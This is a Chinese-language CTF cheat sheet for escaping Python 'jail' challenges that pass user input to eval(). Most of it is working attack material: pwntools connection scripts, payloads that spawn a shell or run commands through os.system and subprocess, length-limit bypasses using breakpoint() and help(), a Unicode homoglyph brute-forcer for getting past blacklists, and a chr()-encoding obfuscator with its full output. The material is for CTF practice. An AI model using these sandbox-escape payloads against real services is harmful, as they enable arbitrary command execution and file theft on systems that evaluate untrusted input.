关键词：jail
一把梭工具：<https://mp.weixin.qq.com/s/3sucM9O27jX8smg7Gv4vKg>



^
nc或python连接入口：
```
from pwn import *

server_ip = '127.0.0.1'
server_port = 26582

connection = remote(server_ip, server_port)

received_data = connection.recv().decode('utf-8')
send_data = received_data[-32:-26] + received_data[-23:-17]

print(received_data)

connection.sendline(send_data.encode('utf-8'))
connection.interactive()
connection.close()
```
一般会给你代码审计，然后连接入口后输入payload。

```
基础代码
eval(user_input_data)
```

^
## **payload**
直接高权限命令读
```
__import__('os').system('sh') 返回交互式shell

__import__('os').system('ls -al /tmp')

__import__('subprocess').run('cd /tmp && ls -al', shell=True)

open("flag").read()
```

低权限文件读
```
print(open('/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918').read())
```

#### **限制长度**
返回交互式终端
```
breakpoint() 然后输入py rce

help()  然后输入sys或os  使用!+命令进行命令执行，!ls  !sh

如果已经是交互式，字符拼接__import__("os").popen("tac flag").read()
'__import__'
_+'("os").p'
_+'open("ta'
_+'c flag")'
_+'.read()'
```

#### **黑名单封了**
使用unicode绕过
```
from unicodedata import normalize
from string import ascii_lowercase
from collections import defaultdict

lst = list(ascii_lowercase)
dic = defaultdict(list)
for char in lst:
    for i in range(0x110000):
        if normalize("NFKC", chr(i)) == char:
            dic[char].append(chr(i))
        if len(dic[char]) > 9:
            break
print(dic)
```
```
在碰撞出来的结果里找字母help/breakpoint
把breakpoint的b改字体就可以了
𝒷reakpoint()  或 𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()



𝒽𝑒ℓ𝓅()
```
脚本提交或者python的nc来pycharam终端粘贴。或者linux终端
```
from pwn import *
 
def start(ss):
 
    p = remote('localhost',52238)
 
    msg = p.recv()
 
    # print(msg)
 
    p.sendline(b'e')
 
    print(p.recv())
 
    p.sendline(ss)
 
    p.interactive()
 
s='breakpoint()'
 
#需要绕过的字符串
 
 
 
for i in range(128,65537):
 
    tmp=chr(i)
 
    try:
 
        res = tmp.encode('idna').decode('utf-8')
 
        if("--") in res:
 
            continue
 
        # print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))
 
        if res in s and len(res)>0:
 
            print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))
 
            start(s.replace(res,tmp))
 
            # break
 
    except:
 
        pass
```


^
## **组合操作**
有的题要你找到key变量。
```
globals() 获取全局的变量看看有没有key

或开启了breakpoint()再
globals()

开启了help()再
__main__
```

^
## **ascii编码绕过**
```
def string_to_chr_ascii(text):
    chr_ascii_result = ""
    for char in text:
        chr_ascii_result += "chr(" + str(ord(char)) + ")+"
    return chr_ascii_result.strip(" + ")

input_string = "__import__('os').system('tac flag_9af31874439b2aad')"
chr_ascii_encoded = string_to_chr_ascii(input_string)
print("ASCII 编码结果:", chr_ascii_encoded)
```
传入代码
```
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(116)+chr(97)+chr(99)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(95)+chr(57)+chr(97)+chr(102)+chr(51)+chr(49)+chr(56)+chr(55)+chr(52)+chr(52)+chr(51)+chr(57)+chr(98)+chr(50)+chr(97)+chr(97)+chr(100)+chr(39)+chr(41))
```